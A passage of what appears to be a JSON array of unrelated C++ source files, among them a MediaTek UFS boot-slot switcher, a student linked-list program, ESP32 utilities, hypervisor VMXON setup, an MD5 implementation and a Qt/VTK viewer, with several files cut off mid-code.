TO A PARTICULAR STANDARD OR OPEN FORUM.\n*\n*  BUYER'S SOLE AND EXCLUSIVE REMEDY AND MEDIATEK'S ENTIRE AND CUMULATIVE\n*  LIABILITY WITH RESPECT TO THE MEDIATEK SOFTWARE RELEASED HEREUNDER WILL BE,\n*  AT MEDIATEK'S OPTION, TO REVISE OR REPLACE THE MEDIATEK SOFTWARE AT ISSUE,\n*  OR REFUND ANY SOFTWARE LICENSE FEES OR SERVICE CHARGE PAID BY BUYER TO\n*  MEDIATEK FOR SUCH MEDIATEK SOFTWARE AT ISSUE.\n*\n*  THE TRANSACTION CONTEMPLATED HEREUNDER SHALL BE CONSTRUED IN ACCORDANCE\n*  WITH THE LAWS OF THE STATE OF CALIFORNIA, USA, EXCLUDING ITS CONFLICT OF\n*  LAWS PRINCIPLES.  ANY DISPUTES, CONTROVERSIES OR CLAIMS ARISING THEREOF AND\n*  RELATED THERETO SHALL BE SETTLED BY ARBITRATION IN SAN FRANCISCO, CA, UNDER\n*  THE RULES OF THE INTERNATIONAL CHAMBER OF COMMERCE (ICC).\n*\n*****************************************************************************/\n\n#include <errno.h>\n#include <fcntl.h>\n#include <string.h>\n#include <string>\n#include <android-base/logging.h>\n\n#if !defined(ARCH_X86)\n#include <ufs-mtk-ioctl.h>\n#include <sys/ioctl.h>\n#endif\n\n#include \"boot_region_control_private.h\"\n\nnamespace android {\nnamespace bootable {\n#if !defined(ARCH_X86)\nstatic bool ufs_set_active_boot_part(int boot)\n{\n    struct ufs_ioctl_query_data idata;\n    unsigned char buf[1];\n    int fd, ret = true;\n\n    fd = open(\"/dev/block/sdc\", O_RDWR);\n    if (fd < 0) {\n        printf(\"%s: open device failed, err: %d\\n\", __func__, fd);\n        return false;\n    }\n\n    buf[0] = boot;           /* 1: BootLU A, 2: BootLU B */\n\n    idata.opcode = UPIU_QUERY_OPCODE_WRITE_ATTR;\n    idata.idn = QUERY_ATTR_IDN_BOOT_LUN_EN;\n    idata.idx = 0;\n    idata.buf_ptr = &buf[0];\n    idata.buf_byte = 1;\n\n    if (ioctl(fd, UFS_IOCTL_QUERY, &idata) < 0) {\n      LOG(ERROR) << \"ufs_set boot_part fail\";\n      ret = false;\n    }\n    close(fd);\n    return ret;\n}\n\nbool BootControlExt::SetBootRegionSlot(unsigned int slot) {\n  int boot_part = 0;\n\n\n  LOG(ERROR) << \"setActiveBootSlot SetBootRegionSlot \" << slot;\n  /* slot 0 is A , slot 1 is B */\n  if (slot >= 2) {\n    LOG(ERROR) << \"Wrong Slot value \" << slot;\n    return 0;\n  }\n\n  if(slot)\n    boot_part = 2;\n  else\n    boot_part = 1;\n\n  if (!ufs_set_active_boot_part(boot_part))\n      return false;\n\n  return true;\n}\n#else\nbool BootControlExt::SetBootRegionSlot(unsigned int slot) {\n  return true;\n}\n#endif //#if !defined(ARCH_X86)\n}\n}\n",
    "#include \"cached_runner.h\"\n#include \"task_runner.h\"\n// TODO: \ud544\uc694\ud55c \ud568\uc218 \uad6c\ud604\n\nCachedRunner::CachedRunner(Cache &cache) : cache_(cache), hits_(0), misses_(0) {}\n\n// \ud30c\uc77c\uc758 \uc22b\uc790\ub97c \uc804\ubd80 \uacf1\ud558\uc5ec \ubc18\ud658\ud55c\ub2e4\ndouble CachedRunner::multiply(std::string filename)\n{\n    double value;\n    if (cache_.get(\"multiply(\" + filename + \")\", value) == true)\n    {\n        hits_++;\n    }\n    else\n    {\n        value = TaskRunner::multiply(filename);\n        cache_.add(\"multiply(\" + filename + \")\", value);\n        misses_++;\n    }\n    return value;\n}\n// \ud30c\uc77c\uc5d0\uc11c \uac00\uc7a5 \uae34 \ud330\ub9b0\ub4dc\ub86c\uc744 \ucc3e\uc544 \uc778\ub371\uc2a4\ub97c \ubc18\ud658\ud55c\ub2e4\nint CachedRunner::palindrome(std::string filename)\n{\n    int value;\n    if (cache_.get(\"palindrome(\" + filename + \")\", value) == true)\n    {\n        hits_++;\n    }\n    else\n    {\n        value = TaskRunner::palindrome(filename);\n        cache_.add(\"palindrome(\" + filename + \")\", value);\n        misses_++;\n    }\n    return value;\n}\n\n// \uce90\uc2dc\uc5d0 \ud788\ud2b8\ud55c \ud69f\uc218\ub97c \ubc18\ud658\ud55c\ub2e4\nint CachedRunner::hits() { return hits_; }\n// \uce90\uc2dc\uc5d0 \ubbf8\uc2a4\ud55c \ud69f\uc218\ub97c \ubc18\ud658\ud55c\ub2e4\nint CachedRunner::misses() { return misses_; }",
    "\n\n#include <iostream>\nusing namespace std;\n\nstruct Node {\n\tint noMhs;\n\tstring name;\n\tNode *next;\n\tNode *prev;\n};\n\nNode *START = NULL;\n\nvoid addNode() \n{\n\tNode* newNode = new Node(); // step 1: create a new node\n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;// assign value to the data field of the new node\n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name; // Assign the value to the data field of the new node\n\n// Insert the new node in the list\n\tif (START == NULL || newNode->noMhs == START->noMhs)\n\t{// step 2: insert the mew node at the beginning\n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs)\n\t\t{\n\t\t\tcout << \"\\033[31mDuplicate roll number not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t// if the list is empty, make the new node to START\n\t\tnewNode->next = START; // step 3: make the new node point to the first node\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = newNode; // step 4 : make the first node point to the new node\n\t\t}\n\t\tnewNode->prev = NULL; // step 5: make the new node point to NULL\n\t\tSTART = newNode; // step 6 : make the new node the first node\n\t}\n\telse\n\t{\n\t// insert the new node in the middle or at the end\n\t\tNode *current = START; // step 1.a: start from the first node\n\t\tNode* previous = NULL; // step 1.b: previous node is NULL initially\n\n\t\twhile(current != NULL && current->noMhs < newNode->noMhs)\n\t\t{\t\t\t\t\t\t\t// step 1.c : traverse the list to find the correct position\n\t\t\tprevious = current;\t\t// step 1.d : move the previous to the current node\n\t\t\tcurrent = current->next;// step 1.e : move the current to the noext node\n\t\t}\n\n\t\tnewNode->next = current; // step 1: Make the next field of the new node point to current.\n\t\tnewNode->prev = previous; // step 5: Make the previous field of the new node point to previous.\n\n\t\tif (current != NULL)\n\t\t{\n\t\t\tcurrent->prev = newNode; // step 6: Make the previous field of the current node point to the new node\n\t\t}\n\t\tif (previous != NULL)\n\t\t{\n\t\t\tprevious->next = newNode; // step 7: Make the next fieldof the previous node point to the new node.\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// if previous is still NULL, its means newNode is now the first node\n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\n\n\nbool search(int rollNo, Node **previous,  Node **current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current; //\n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo; // 3: get the roll number to be deleted\n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START; // step 1 : start from the first node\n\tprevious = NULL;\n\n\t// locate the node to be deleted\n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mThe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\n\t// Node to be deleted is the first node\n\tif (current == START)\n\t{\n\t\tSTART = START->next; // step 2: update the START pointer\n\t\tif (START != NULL)\n\t\t{\n\t\t\tSTART->prev = NULL; // step\n\t\t}\n\t}\n\telse\n\t{ // Node to be deleted is not the first Node\n\t\tprevious->next = current->next;\n\t\tif (current->next != NULL)\n\t\t{ // if there's a succesor, update its prev pointer\n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\n\t// Release the memory of the node marked as current\n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" delete\\x1b[0m\" << endl;\n}\n\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\n\nvoid traverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\tcout << \"\\nRecords in ascending order of roll number are:\" << endl;\n\tNode* currentNode = START;\n\twhile (currentNode != NULL)\n\t{\n\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->next;\n\t\t}\n\t}\n}\n\nvoid revtraverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord in descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\t}\n}\n\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\tNode* prev, * curr;\n\tprev = curr = NULL;\n\tcout << \"\\nEnter the roll number of the student whose record you want to search: \";\n\tint num;\n\tcin >> num;\n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl;\n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl;\n\t\tcout << \"\\nName: \" << curr->name << endl;\n\t}\n}\n\n\n\nint main()\n{\n\n}\n\n\n",
    "#include \"utilities.h\"\n\nvoid array_to_hex(uint8_t *inputArray, char *outputBuffer, unsigned int len){\n    unsigned int idx;\n    char nib1,nib2;\n    for (idx = 0; idx < len; idx++){\n        nib1 = (inputArray[idx] >> 4) & 0x0F;\n        nib2 = (inputArray[idx] >> 0) & 0x0F;\n        outputBuffer[idx*2+0] = nib1  < 0xA ? '0' + nib1  : 'A' + nib1  - 0xA;\n        outputBuffer[idx*2+1] = nib2  < 0xA ? '0' + nib2  : 'A' + nib2  - 0xA;\n    }\n    outputBuffer[len*2] = '\\0';\n}\n\n\n// https://espressif-docs.readthedocs-hosted.com/projects/arduino-esp32/en/latest/api/reset_reason.html\n// https://wokwi.com/projects/392195636782398465\nuint8_t getResetReason( char reasonText[], uint8_t cpuCore ){\n  RESET_REASON reason = rtc_get_reset_reason(cpuCore);\n  switch (reason){\n    case 1 : sprintf(reasonText,\"POWERON_RESET\");break;          /**<1, Vbat power on reset*/\n    case 3 : sprintf(reasonText,\"SW_RESET\");break;               /**<3, Software reset digital core*/\n    case 4 : sprintf(reasonText,\"OWDT_RESET\");break;             /**<4, Legacy watch dog reset digital core*/\n    case 5 : sprintf(reasonText,\"DEEPSLEEP_RESET\");break;        /**<5, Deep Sleep reset digital core*/\n    case 6 : sprintf(reasonText,\"SDIO_RESET\");break;             /**<6, Reset by SLC module, reset digital core*/\n    case 7 : sprintf(reasonText,\"TG0WDT_SYS_RESET\");break;       /**<7, Timer Group0 Watch dog reset digital core*/\n    case 8 : sprintf(reasonText,\"TG1WDT_SYS_RESET\");break;       /**<8, Timer Group1 Watch dog reset digital core*/\n    case 9 : sprintf(reasonText,\"RTCWDT_SYS_RESET\");break;       /**<9, RTC Watch dog Reset digital core*/\n    case 10 : sprintf(reasonText,\"INTRUSION_RESET\");break;       /**<10, Instrusion tested to reset CPU*/\n    case 11 : sprintf(reasonText,\"TGWDT_CPU_RESET\");break;       /**<11, Time Group reset CPU*/\n    case 12 : sprintf(reasonText,\"SW_CPU_RESET\");break;          /**<12, Software reset CPU*/\n    case 13 : sprintf(reasonText,\"RTCWDT_CPU_RESET\");break;      /**<13, RTC Watch dog Reset CPU*/\n    case 14 : sprintf(reasonText,\"EXT_CPU_RESET\");break;         /**<14, for APP CPU, reseted by PRO CPU*/\n    case 15 : sprintf(reasonText,\"RTCWDT_BROWN_OUT_RESET\");break;/**<15, Reset when the vdd voltage is not stable*/\n    case 16 : sprintf(reasonText,\"RTCWDT_RTC_RESET\");break;      /**<16, RTC Watch dog reset digital core and rtc module*/\n    default : sprintf(reasonText,\"NO_MEANING\");\n  }\n  return reason;\n}\n\n\n// Very good example of getting partition data directly\n// https://wokwi.com/projects/385965135746234369\nvoid printPartitionTable() {\n  Serial.printf(\"ESP32 Partition table:\\n\");\n  Serial.printf(\"+ ---- | --- | -------- | -------- | ---------------- +\\n\");\n  Serial.printf(\"| Type | Sub |  Offset  |   Size   |       Label      |\\n\");\n  Serial.printf(\"| ---- | --- | -------- | -------- | ---------------- |\\n\");\n  esp_partition_iterator_t pi = esp_partition_find(ESP_PARTITION_TYPE_ANY, ESP_PARTITION_SUBTYPE_ANY, NULL);\n  if (pi != NULL) {\n    do {\n      const esp_partition_t* p = esp_partition_get(pi);\n      Serial.printf(\"|  %02x  | %02x  | 0x%06X | 0x%06X | %-16s |\\r\\n\", \n        p->type, p->subtype, p->address, p->size, p->label);\n    } while (pi == (esp_partition_next(pi)));\n  }\n  Serial.printf(\"+ ---- | --- | -------- | -------- | ---------------- +\\n\");\n  uint8_t partitionSha256[32];\n  const esp_partition_t* runningPartition = esp_ota_get_running_partition();\n  const esp_app_desc_t* appDescription = esp_ota_get_app_description();\n  char shaText[17] = {0};\n  char idfVersion[32] = {0};\n  strcpy(idfVersion,appDescription->idf_ver);\n  for( int idx=0; idx<=7; idx++ ) sprintf(shaText+idx*2,\"%02x\",appDescription->app_elf_sha256[idx]);\n  if( esp_partition_get_sha256(runningPartition, partitionSha256) == ESP_OK ){\n    Serial.printf(\"Active partition %s ELF file SHA256: %s IDF version: %s\\n\\n\",runningPartition->label,shaText,idfVersion);\n  }\n\n\n\n}\n\nvoid listRootDir(){\n  listDir( \"/\", 5);\n}\n\nvoid listDir(const char *dirname, uint8_t levels) {\n  File root = LittleFS.open(dirname);\n  File file = root.openNextFile();\n  while (file) {\n    if (file.isDirectory()) {\n      Serial.printf( \"%50s \\n\",file.path() );\n      if (levels) {\n        listDir(file.path(), levels - 1);\n      }\n    } else {\n      time_t lw = file.getLastWrite();\n      struct tm *tmstruct = localtime(&lw);\n      Serial.printf(\"%50s %d-%02d-%02d %02d:%02d:%02d %d\\n\",file.path(),(tmstruct->tm_year) + 1900, (tmstruct->tm_mon) + 1, tmstruct->tm_mday, tmstruct->tm_hour, tmstruct->tm_min, tmstruct->tm_sec,file.size() );\n    }\n    file = root.openNextFile();\n    \n  }\n}\n",
    "#include \"vmxon.hpp\"\n\nnamespace vmxon\n{\n\tauto create_vmxon_region(hv::pvcpu_ctx vcpu_ctx) -> void\n\t{\n\t\tPHYSICAL_ADDRESS mem_range;\n\t\tmem_range.QuadPart = ~0ull;\n\n\t\thv::vmx_basic_msr_t vmx_basic;\n\t\tvmx_basic.control = __readmsr(IA32_VMX_BASIC);\n\n\t\tvcpu_ctx->vmxon_phys =\n\t\t\tMmGetPhysicalAddress(&vcpu_ctx->vmxon).QuadPart;\n\n\t\tvcpu_ctx->vmxon\n\t\t\t.header\n\t\t\t.bits\n\t\t\t.revision_identifier =\n\t\t\t\tvmx_basic.bits\n\t\t\t\t\t.vmcs_revision_identifier;\n\t}\n\n\tauto create_vmcs(hv::pvcpu_ctx vcpu_ctx) -> void\n\t{\n\t\tPHYSICAL_ADDRESS mem_range;\n\t\tmem_range.QuadPart = ~0ull;\n\n\t\thv::vmx_basic_msr_t vmx_basic;\n\t\tvmx_basic.control = __readmsr(IA32_VMX_BASIC);\n\n\t\tvcpu_ctx->vmcs_phys =\n\t\t\tMmGetPhysicalAddress(&vcpu_ctx->vmcs).QuadPart;\n\n\t\tvcpu_ctx->vmcs\n\t\t\t.header\n\t\t\t.bits\n\t\t\t.revision_identifier =\n\t\t\t\tvmx_basic.bits\n\t\t\t\t\t.vmcs_revision_identifier;\n\t}\n\n\tauto create_vcpus(hv::pvmx_ctx vmx_ctx) -> void\n\t{\n\t\tvmx_ctx->vcpu_count = \n\t\t\tKeQueryActiveProcessorCountEx(\n\t\t\t\tALL_PROCESSOR_GROUPS);\n\n\t\tfor (auto idx = 0u; idx < vmx_ctx->vcpu_count; ++idx)\n\t\t{\n\t\t\tcreate_vmxon_region(&vmx_ctx->vcpus[idx]);\n\t\t\tcreate_vmcs(&vmx_ctx->vcpus[idx]);\n\t\t}\n\t}\n\n\tauto init_vmxon() -> void\n\t{\n\t\thv::cr_fixed_t cr_fixed;\n\t\thv::cr0_t cr0 = { 0 };\n\t\thv::cr4_t cr4 = { 0 };\n\n\t\tcr_fixed.all = __readmsr(IA32_VMX_CR0_FIXED0);\n\t\tcr0.flags = __readcr0();\n\t\tcr0.flags |= cr_fixed.split.low;\n\t\tcr_fixed.all = __readmsr(IA32_VMX_CR0_FIXED1);\n\t\tcr0.flags &= cr_fixed.split.low;\n\t\t__writecr0(cr0.flags);\n\n\t\tcr_fixed.all = __readmsr(IA32_VMX_CR4_FIXED0);\n\t\tcr4.flags = __readcr4();\n\t\tcr4.flags |= cr_fixed.split.low;\n\t\tcr_fixed.all = __readmsr(IA32_VMX_CR4_FIXED1);\n\t\tcr4.flags &= cr_fixed.split.low;\n\t\t__writecr4(cr4.flags);\n\n\t\tconst auto vmxon_result = \n\t\t\t__vmx_on((unsigned long long*)\n\t\t\t\t&vmxon::g_vmx_ctx.vcpus[\n\t\t\t\t\tKeGetCurrentProcessorNumber()].vmxon_phys);\n\t}\n}",
    "#include <opencv2/opencv.hpp>\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <thread>\n#include <filesystem>\n#include <map>\n#include <mutex>\n#include <string>\n#include <cmath>\n#include <iomanip>\n#include <limits>\n#include <chrono>\n\nnamespace fs = std::filesystem;\nstd::mutex io_mutex;\n\nstd::string formatNumber(int num, int length)\n{\n    std::ostringstream oss;\n    oss << std::setw(length) << std::setfill('0') << num;\n    return oss.str();\n}\n\nstd::map<char, cv::Mat> load_font_images(const std::string &font_dir)\n{\n    std::map<char, cv::Mat> font_images;\n    for (const auto &entry : fs::directory_iterator(font_dir))\n    {\n        if (entry.path().extension() == \".png\")\n        {\n            std::string filename = entry.path().stem().string();\n            int char_code;\n            try\n            {\n                char_code = std::stoi(filename);\n            }\n            catch (const std::invalid_argument &ia)\n            {\n                std::cerr << \"Invalid argument: \" << ia.what() << '\\n';\n                continue;\n            }\n            catch (const std::out_of_range &oor)\n            {\n                std::cerr << \"Out of Range error: \" << oor.what() << '\\n';\n                continue;\n            }\n\n            if (char_code < 0 || char_code > 255)\n            {\n                std::cerr << \"Character code out of valid range: \" << char_code << '\\n';\n                continue;\n            }\n\n            char char_code_char = static_cast<char>(char_code);\n            cv::Mat img = cv::imread(entry.path(), cv::IMREAD_GRAYSCALE);\n            if (img.empty())\n            {\n                std::cerr << \"Failed to load image for char code \" << char_code_char << \" at path \" << entry.path() << std::endl;\n                continue;\n            }\n\n            font_images[char_code_char] = img;\n        }\n    }\n    return font_images;\n}\n\nstd::pair<char, cv::Mat> compare_matrices(const cv::Mat &segment, const std::map<char, cv::Mat> &font_images)\n{\n    double min_distance = std::numeric_limits<double>::max();\n    char best_match_char = 0;\n    cv::Mat best_match_img;\n\n    for (const auto &[char_code, font_image] : font_images)\n    {\n        if (!segment.empty() && !font_image.empty() && segment.type() == font_image.type() && segment.size() == font_image.size())\n        {\n            cv::Mat font_image_inv;\n            cv::bitwise_not(font_image, font_image_inv); // For some reason, the images need to be inverted for the comparison to work\n            cv::bitwise_not(segment, segment);           // Same thing here\n\n            double distance = cv::norm(segment, font_image_inv, cv::NORM_L2);\n\n            if (distance < min_distance)\n            {\n                min_distance = distance;\n                best_match_char = char_code;\n                best_match_img = font_image;\n            }\n        }\n        else\n        {\n            std::cerr << \"Incompatible or empty images for char \" << char_code << std::endl;\n        }\n    }\n    if (best_match_char <= 0 || best_match_char > 127)\n    {\n        std::cerr << \"Invalid character match detected, using default.\" << std::endl;\n        best_match_char = '?'; // Default character if no valid match found\n    }\n    return {best_match_char, best_match_img};\n}\n\nvoid process_frame(const cv::Mat &frame, int count, const std::map<char, cv::Mat> &font_images, int font_size, const std::string &output_img_dir, const std::string &output_txt_dir)\n{\n    cv::Mat gray_frame;\n    cvtColor(frame, gray_frame, cv::COLOR_BGR2GRAY);\n\n    cv::Mat output_image = cv::Mat::zeros(gray_frame.size(), gray_frame.type());\n    std::vector<std::string> characters_grid;\n\n    for (int j = 0; j <= gray_frame.rows - font_size; j += font_size)\n    {\n        std::string row_chars;\n        for (int i = 0; i <= gray_frame.cols - font_size; i += font_size)\n        {\n            cv::Rect region(i, j, font_size, font_size);\n            cv::Mat segment = gray_frame(region);\n\n            auto [best_match_char, best_match_img] = compare_matrices(segment, font_images);\n            cv::Mat destination = output_image(cv::Rect(i, j, font_size, font_size));\n            best_match_img.copyTo(destination);\n            row_chars += best_match_char;\n        }\n        characters_grid.push_back(row_chars);\n    }\n\n    std::string frame_filename = output_img_dir + \"/frame_\" + formatNumber(count, 10) + \".png\";\n    std::string text_filename = output_txt_dir + \"/frame_\" + formatNumber(count, 10) + \".txt\";\n\n    bool isWritten = cv::imwrite(frame_filename, output_image);\n    if (!isWritten)\n    {\n        std::cerr << \"Failed to write image to \" << frame_filename << std::endl;\n    }\n\n    std::ofstream file(text_filename);\n    if (!file)\n    {\n        std::cerr << \"Failed to open text file \" << text_filename << std::endl;\n    }\n    else\n    {\n        for (const auto &row : characters_grid)\n        {\n            file << row << '\\n';\n        }\n    }\n\n    std::lock_guard<std::mutex> guard(io_mutex);\n}\n\nint main(int argc, ch",
    "/*\n * Author: Caide Marc Spriestersbach\n * Student Number: SPRCAI002\n * Date: 2 May 2024\n * Project Title: C++ MD5 Hashing Library\n * Description: Various implementations of the MD5 hashing algorithm. This implementation is based on the MD5 algorithm described in RFC 1321. This also solely focuses on the C++ implementation of the MD5 algorithm.\n */\n\n#include <fstream>\n#include <iostream>\n#include <vector>\n#include <chrono>\n\n// Define a typedef for a function pointer that takes three uint32_t and returns a uint32_t\ntypedef uint32_t (*FuncPtr)(uint32_t, uint32_t, uint32_t);\n\n// The rotation amounts for each round\nstatic const constexpr uint32_t S[64] = {\n        7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,\n        5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,\n        4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,\n        6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21\n};\n\n// The constants for each round\nstatic const constexpr uint32_t K[64] = {\n        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,\n        0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,\n        0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,\n        0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,\n        0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,\n        0xd62f105d, 0x2441453, 0xd8a1e681, 0xe7d3fbc8,\n        0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,\n        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,\n        0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,\n        0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,\n        0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x4881d05,\n        0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,\n        0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,\n        0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,\n        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,\n        0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391\n};\n\n// The g values for each round\nstatic const constexpr uint32_t g_values[64] = {\n        0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, // for j <= 15\n        1, 6, 11, 0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12, // for j <= 31\n        5, 8, 11, 14, 1, 4, 7, 10, 13, 0, 3, 6, 9, 12, 15, 2, // for j <= 47\n        0, 7, 14, 5, 12, 3, 10, 1, 8, 15, 6, 13, 4, 11, 2, 9  // for j <= 63\n};\n\nuint32_t a0 = 0x67452301; // Initial value of 'a' where 'a' is a 32-bit word.\nuint32_t b0 = 0xefcdab89; // Initial value of 'b' where 'b' is a 32-bit word.\nuint32_t c0 = 0x98badcfe; // Initial value of 'c' where 'c' is a 32-bit word.\nuint32_t d0 = 0x10325476; // Initial value of 'd' where 'd' is a 32-bit word.\n\n// In each bit position F acts as a conditional: if X then Y else Z. The expression for F is: F(X,Y,Z) = XY v not(X) Z\ninline uint32_t F(uint32_t x, uint32_t y, uint32_t z) {\n    return (x & y) | (~x & z);\n}\n\n// The expression for G is: G(X,Y,Z) = XZ v Y not(Z)\ninline uint32_t G(uint32_t x, uint32_t y, uint32_t z) {\n    return (x & z) | (y & ~z);\n}\n\n// The expression for H is: H(X,Y,Z) = X xor Y xor Z\ninline uint32_t H(uint32_t x, uint32_t y, uint32_t z) {\n    return x ^ y ^ z;\n}\n\n// The expression for I is: I(X,Y,Z) = Y xor (X v not(Z))\ninline uint32_t I(uint32_t x, uint32_t y, uint32_t z) {\n    return y ^ (x | ~z);\n}\n\n// Define the lookup table\nFuncPtr funcTable[4] = {F, G, H, I};\n\n// Calculate the MD5 hash of the input message\nstd::array<uint8_t, 16> calculate(const std::string& inputStr) {\n    std::vector<uint8_t> input(inputStr.begin(), inputStr.end());\n    uint64_t bitLen = input.size() * 8; // original length in bits\n\n    // Step 1: Append a single '1' bit\n    input.push_back(0x80); // in bits: 10000000\n\n    // Step 2: Append '0' bits until length is 448 modulo 512\n    while (input.size() % 64 != 56) { // 448 = 512 - 64\n        input.push_back(0); // in bits: 00000000\n    }\n\n    // Step 3: Append 64-bit representation of original length\n    for (int i = 0; i < 8; ++i) { // 64 bits = 8 bytes\n        input.push_back(bitLen >> (i * 8)); // append 8 bits at a time from the 64-bit length\n    }\n\n    // Step 4: Initialize MD Buffer\n    // Here each of A, B, C, D is a 32-bit register. These registers will contain the final hash.\n    uint32_t A = a0;\n    uint32_t B = b0;\n    uint32_t C = c0;\n    uint32_t D = d0;\n\n    // Step 5: Process Message in 16-Word Blocks\n    for (size_t i = 0; i < input.size(); i += 64) {\n        // Break chunk into sixteen 32-bit words M[j], 0 \u2264 j \u2264 15\n        uint32_t M[16];\n        for (int j = 0; j < 16; ++j) {\n            M[j] = (input[i + j*4 + 3] << 24) | (input[i + j*4 + 2] << 16) | (input[i + j*4 + 1] << 8) | input[i + j*4];\n        }\n\n        // Initialize hash value for this chunk\n        // Note: The following are copies of A, B, C, D which initially are set to a0, b0, c0, and d0 respectively for the first chunk.\n        uint32_t AA = A;\n        uint32_t BB = B;\n        uint32_t CC = C;\n        uint32_t DD = D;\n\n        // Main loop\n        for (int j = 0; j < 64; j += 4) {\n            uint32_t tempF[4], g[4], te",
    "#include \"mainwindow.h\"\n#include \"VRRenderThread.h\"\n#include \"./ui_mainwindow.h\"\n\n#include <QFileDialog>\n#include <QMessageBox>\n#include \"optiondialog.h\"\n#include <qcheckbox.h>\n#include <QAbstractItemModel>\n#include <vtkCylinderSource.h>\n#include <vtkActor.h>\n#include <vtkProperty.h>\n#include <vtkPolyDataMapper.h>\n#include <vtkCamera.h>\n#include <vtkRenderer.h>\n#include <vtkLight.h>\n\n\nMainWindow::MainWindow(QWidget* parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n    ui->treeView->addAction(ui->actionItem_Options);\n    /* Create/allocate the ModelList */\n    this->partList = new ModelPartList(\"Parts List\");\n\n    /* Link it to the tree view in the GUI */\n    ui->treeView->setModel(this->partList);\n\n    // Create and configure a scene light\n// ... Add actors here (not shown)\n\n// Render the scene\n /* This needs adding to MainWindow constructor */\n    /* Link a render window with the Qt widget */\nrenderWindow = vtkSmartPointer<vtkGenericOpenGLRenderWindow>::New();\nui->VTKwidget->setRenderWindow(renderWindow);\n\n// Add light to renderer after rendering (important for VTK)\n\n    /* Add a renderer */\n    renderer = vtkSmartPointer<vtkRenderer>::New();\n    renderWindow->AddRenderer(renderer);\n\n    vtkSmartPointer<vtkLight> light = vtkSmartPointer<vtkLight>::New();\n\n\n    // **Create temporary cylinder geometry (replace with CAD model loading later)**\n    vtkNew<vtkCylinderSource> cylinder; // Create a cylinder source object\n    cylinder->SetResolution(8);         // Set the number of facets (sides)\n\n    // Create mapper for cylinder\n    vtkNew<vtkPolyDataMapper> cylinderMapper;\n    cylinderMapper->SetInputConnection(cylinder->GetOutputPort());  // Connect the cylinder source to the mapper\n\n    // Create actor for cylinder with color and rotation\n    vtkNew<vtkActor> cylinderActor;\n    cylinderActor->SetMapper(cylinderMapper);                        // Set the mapper for the actor\n    cylinderActor->GetProperty()->SetColor(1.0, 0.0, 0.35);            // Set the color to red\n    cylinderActor->RotateX(30.0);                                      // Rotate around X-axis\n    cylinderActor->RotateY(-45.0);                                     // Rotate around Y-axis\n\n    // Add actor to renderer\n    renderer->AddActor(cylinderActor);\n\n    /* Reset Camera (probably needs to go in its own function that is called whenever\n    model is changed) */\n    renderer->ResetCamera();\n    renderer->GetActiveCamera()->Azimuth(30);\n    renderer->GetActiveCamera()->Elevation(30);\n    renderer->ResetCameraClippingRange();\n\n    // Connect the 